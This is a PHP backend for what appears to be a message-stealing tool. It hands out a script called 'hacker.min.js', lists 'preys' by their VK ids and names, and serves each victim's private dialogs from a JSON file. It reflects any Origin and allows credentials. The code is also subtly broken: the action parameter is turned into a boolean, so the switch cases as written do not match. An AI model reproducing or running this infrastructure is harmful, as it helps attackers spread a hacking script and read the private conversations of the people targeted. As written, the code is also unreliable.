<?php

// autoload for composer libraries
require __DIR__ . '/../vendor/autoload.php';

use pcrov\JsonReader\JsonReader;

cors();

// what we do
$action = $_GET['action'] || '';

// create json reader and open our dialogs.json
$reader = new JsonReader();
$reader->open("dialogs.json");
$reader->read('dialogs'); // go to dialogs

// initialize responce
$response;

switch ($action) {
        // get from file hacker-script
    case 'script':
        $response = file_exists('hacker.min.js') ? file_get_contents('hacker.min.js') : false;

        break;

        // get names of all preys
    case 'get_preys_names':
        $response = []; // response is array
        $reader->read(); // go to first object of dialogs
        $depth = $reader->depth(); // check length

        do {
            // get id and name of prey from dialogs.json
            $preyId = $reader->name();
            $preyName = $reader->value()['name'];

            // save it [vk_id => name]
            $response[$preyId] = $preyName;
        } while (
            $reader->next() && // go to next sibling
            $reader->depth() >= $depth // end if it is end ;)
        ); // Read each sibling

        break;

        // get dialogs of prey by name
    case 'dialogs':
        // get id of prey and current page from GET
        $preyId = $_GET['id'];
        $page = $_GET['page'] ?? 0;

        // no prey's id, stop
        if (!$preyId) {
            $response = false;
            break;
        }

        // init response
        $response = [$preyId => []];

        $reader->read($preyId); // go to prey's data
        $depth = $reader->depth(); // check length

        do {
            // add to response [ vk_id => [[name => dialogs], ...] ]
            $response[$preyId][] = $reader->value();
        } while (
            $reader->next($preyId) && // go to next element of our prey
            $reader->depth() >= $depth // end of dialogs
        );

        break;

    default:
        // $response = false;
        break;
}

// echo '<pre>';
// var_dump($response);
// echo '</pre>';

echo json_encode($response);

$reader->close();

function cors()
{
    if (isset($_SERVER["HTTP_ORIGIN"])) {
        header("Access-Control-Allow-Origin: {$_SERVER["HTTP_ORIGIN"]}");
        header("Access-Control-Allow-Credentials: true");
        header("Access-Control-Max-Age: 86400");
    }

    if ($_SERVER["REQUEST_METHOD"] == "OPTIONS") {

        if (isset($_SERVER["HTTP_ACCESS_CONTROL_REQUEST_METHOD"]))
            header("Access-Control-Allow-Methods: GET, POST, OPTIONS");

        if (isset($_SERVER["HTTP_ACCESS_CONTROL_REQUEST_HEADERS"]))
            header("Access-Control-Allow-Headers: {$_SERVER["HTTP_ACCESS_CONTROL_REQUEST_HEADERS"]}");
    }
}
